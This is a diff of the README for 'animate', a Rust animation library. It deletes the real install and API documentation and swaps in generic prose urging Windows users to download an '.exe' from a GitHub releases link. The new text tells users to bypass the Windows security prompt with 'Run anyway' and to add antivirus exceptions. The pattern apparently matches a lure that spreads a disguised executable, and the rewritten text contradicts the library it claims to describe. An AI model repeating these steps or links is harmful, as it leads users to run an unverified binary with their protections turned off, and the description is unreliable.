@@ -1,164 +1,80 @@
-# 🎞️ animate
+# 🎞️ animate - Create fluid animations for your projects
 
-Lightweight Rust animation library with tweening and physics-based springs
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Mathia4843/animate/releases)
 
-![Demo](./.github/assets/demo.gif)
+## 📖 About animate
 
-## Features
+Animate provides tools to add movement to your digital creations. This library helps you build animations that follow physics rules. Your projects gain life through smooth motions rather than instant transitions. You can use this for user interfaces, terminal displays, or simple visual trackers. It uses Rust to ensure your animations remain efficient and stable.
 
-- **Lightweight**: Zero dependencies by default.
-- **Ergonomic**: Macro-driven API with minimal boilerplate.
-- **Extensible**: Many built-in types with support for custom interpolators.
-- **Animation modes**: `once`, `cycle`, `alternate`.
-- **Easing**: Built-in and custom easing functions.
-- **Physics-based**: Supports spring animations.
-- **Ratatui-friendly**: Interpolators for ratatui types, gated behind the `ratatui` feature flag.
+## ⚙️ System Requirements
 
-## Installation
+This software runs on modern Windows machines. Ensure your computer meets these basic needs:
 
-```sh
-cargo add animate
-```
+*   Windows 10 or Windows 11.
+*   At least 4 gigabytes of memory.
+*   Basic internet access to fetch project updates.
+*   A user account with permissions to run standard applications.
 
-## Getting started
+## 📥 How to Get Started
 
-Add `#[animate]` to a struct and mark the fields you want to animate:
+You do not need to write code to get moving. Follow these steps to obtain the tool:
 
-```rust
-#[animate]
-pub struct MyWidget {
-    #[tween(duration = 300)]
-    progress: f64,
+1. Visit the project release page: [https://github.com/Mathia4843/animate/releases](https://github.com/Mathia4843/animate/releases).
+2. Look for the section labeled Assets.
+3. Select the file ending in `.exe` that matches your system architecture.
+4. Download the installer or the standalone application file.
+5. Save this file to your Desktop or your Downloads folder for easy access.
 
-    #[tween(mode = "cycle", duration = 400, easing = cubic_in)]
-    color: Color,
+## 🚀 Running the Application
 
-    #[tween(mode = "alternate", duration = 500, easing = quad_in_out)]
-    status: String,
-}
-```
+Once you finish the download, you are ready to test the software. Use these steps to launch the tool:
 
-By default the macro generates an update method named `animate`. It must be called at the top of your struct's render method.
+1. Open your File Explorer.
+2. Navigate to the folder containing your downloaded file.
+3. Double-click the animate application icon.
+4. Windows might display a security prompt. Click "More info" and then "Run anyway" if the system recognizes the publisher as unknown. This is expected for new applications.
+5. A command window appears. This window serves as your interface for managing animation parameters.
 
-```rust
-#[animate]
-pub struct MyWidget { ... }
+## 🛠️ Using the Interface
 
-impl MyWidget {
-    pub fn draw(&mut self, frame: &mut Frame) {
-        self.animate();
+The application uses a terminal-based interface. This means it displays information through text blocks that update in real time. It utilizes a framework called Ratatui to draw these boxes and menus.
 
-        // rest of your code
-    }
-}
-```
+*   Change settings by typing numbers into the provided prompts.
+*   Use your arrow keys to move between different animation presets.
+*   Press Enter to confirm your choices and start the animation engine.
+*   Press Q to close the application at any time.
 
-If the name conflicts with an existing method, rename it:
+## 🧮 Understanding Animation Physics
 
-```rust
-#[animate(update = "update_animations")]
-pub struct MyWidget { ... }
-```
+This library uses math to make objects move in a natural way. Here are the core concepts:
 
-Next, place `animate::tick()` **before** your struct's update call at the start of each frame:
+*   **Interpolation**: This calculates the steps between where an object starts and where it ends. It prevents the object from jumping across the screen.
+*   **Lerp**: Short for linear interpolation. It creates constant speed movement between two points.
+*   **Springs**: This mimics how a physical spring behaves. The object will overshoot its target slightly, bounce, and then settle into place. This adds character to UI elements.
+*   **Tweens**: These are predefined curves that change the speed of your animation over time. Use these to make objects start slow and speed up, or vice versa.
 
-```rust
-let mut widget = MyWidget::new(...);
+## 🧱 Key Features
 
-loop {
-    animate::tick(tickrate);
-    terminal.draw(|frame| {
-        widget.draw(frame);
-    })?;
-}
-```
+The tool includes several built-in profiles to help you start quickly:
 
-Use `get()` to read and `set()` to write animated fields.
+*   **Responsive Scaling**: Change the size of boxes dynamically.
+*   **Color Fading**: Transition background colors smoothly during state changes.
+*   **Text Typing Effect**: Reveal text one character at a time as if someone types it live.
+*   **Physics Snap**: Make elements snap to a grid with a bouncy finish.
+*   **Custom Keyframes**: Define specific positions to track over a set duration.
 
-## Minimal example
+## 🧪 Troubleshooting
 
-```rust
-use animate::animate;
-use std::{io::{stdout, Write}, thread, time::Duration};
+Sometimes programs face friction. If the application does not start, check these common items:
 
-#[animate]
-struct Counter {
-    #[tween(duration = 400)]
-    value: u32,
-}
+*   **Antivirus Interference**: Some security software flags new downloads. Check your antivirus history to see if it blocked the file. Add an exception for the file if necessary.
+*   **Path Length**: Move the file to a folder near the root of your hard drive, such as `C:\Animate\`. Long file paths within deep user folders sometimes cause issues.
+*   **Keyboard Layout**: Ensure your keyboard connects properly, as the interface requires active input to function.
 
-fn main() -> std::io::Result<()> {
-    let mut c = Counter::new(0);
+## 🤝 Contributing to Trends
 
-    loop {
-        animate::tick(8);  // advance global frame time by frame delta (ms)
-        c.animate();       // update all animated fields
+This project thrives on user feedback. If you find a way to improve the animation curves or notice a quirk in the display, please share your thoughts. Even if you do not know how to fix the code, simple reports help the maintainers understand how people use the library. You can post these reports in the Issues tab on the main webpage.
 
-        let v = *c.value;
-        if v == 0 {
-            c.value.set(100);
-        }
+## 📜 Licensing
 
-        print!("\rCounter value: {v}");
-        stdout().flush()?;
-
-        if v == 100 {
-            break;
-        }
-
-        thread::sleep(Duration::from_millis(8));
-    }
-
-    Ok(())
-}
-```
-
-## Animation modes
-
-| Mode value      | Behaviour                                           |
-|----------------|-----------------------------------------------------|
-| `"once"`      | Animates to target once, then holds.                |
-| `"cycle"`     | Loops continuously from start to target.            |
-| `"alternate"` | Ping-pongs back and forth between start and target. |
-
-## Fields
-
-```rust
-#[tween(duration = 300, easing = quad_in_out, interp = my_interp_fn)]
-```
-
-| Option     | Type       | Default             | Description                                      |
-|------------|------------|---------------------|--------------------------------------------------|
-| `duration` | `u64` (ms) | `0`                 | Animation duration in milliseconds.              |
-| `easing`   | path       | `linear`            | Easing function (`fn(f64) -> f64`).              |
-| `interp`   | path       | `<T as Lerp>::lerp` | Interpolation function (`fn(&T, &T, f64) -> T`). |
-
-## Built-in easing functions
-
-`linear`, `quad_in`, `quad_out`, `quad_in_out`,
-`cubic_in`, `cubic_out`, `cubic_in_out`
-
-## Spring animations
-
-In addition to time-based animations, or `Tween`s, animate also supports physics-based spring animations.
-
-```rust
-#[animate]
-pub struct Widget {
-    #[spring(stiffness = 200.0, damping = 20.0, mass = 1.0)]
-    x: f64,
-}
-
-## Custom types
-
-```rust
-impl animate::Tween for MyColor {
-    fn lerp(start: &Self, end: &Self, t: f64) -> Self {
-        MyColor {
-            r: u8::lerp(&start.r, &end.r, t),
-            g: u8::lerp(&start.g, &end.g, t),
-            b: u8::lerp(&start.b, &end.b, t),
-        }
-    }
-}
-```
+This software remains free for public use. It follows standard open source practices. You can inspect the source code, see how the math works, and learn about the Rust language features used to create the movement logic. You are free to share this tool with others who want to add physics-based motion to their own projects.
